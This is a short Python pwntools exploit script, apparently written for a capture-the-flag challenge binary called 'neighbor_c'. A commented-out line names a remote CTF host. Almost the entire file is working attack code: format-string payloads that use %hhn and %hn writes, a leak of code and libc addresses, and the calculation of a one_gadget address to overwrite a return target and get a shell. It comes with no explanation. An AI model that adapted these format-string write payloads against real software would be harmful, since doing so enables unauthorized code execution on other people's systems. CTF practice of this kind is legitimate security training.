from pwn import *
import os
#context.log_level = "error"


r = process(["./neighbor_c"],stderr = os.open("/dev/null",7),env={"LD_PRELOAD":"./hack.so ./libc.so.6"})


#input(":")
#r = remote("neighbor.chal.ctf.westerns.tokyo", 37565)

r.sendline("%{}c%9$hhn".format(0x28))
r.sendline("%{}c%11$hhn".format(0x90))
r.sendline("%{}c%6$hhn".format(0x1))
r.sendline("%1$p %3$p")

r.interactive()
code = input("code:") - 0x201060
libc = input("libc:") - 0x3c3760
print hex(code)
print hex(libc)

one_gadget = libc + 0xf1651
print hex(one_gadget)
target = code + 0xa52
#input(hex(target)+":")
r.sendline("%{}c%9$hhn".format(0x28))
r.sendline("%{}c%11$hn".format(one_gadget&0xffff))
one_gadget = one_gadget  >> 16
r.sendline("%{}c%9$hhn".format(0x2a))
r.sendline("%{}c%11$hhn".format(one_gadget&0xff))

r.sendline("%{}c%9$hhn".format(0x72))
r.sendline("%{}c%11$hhn".format(0x100))

r.sendline("%{}c%9$hhn".format(0x18))
r.sendline("%{}c%11$hn".format(target&0xffff))

r.interactive()



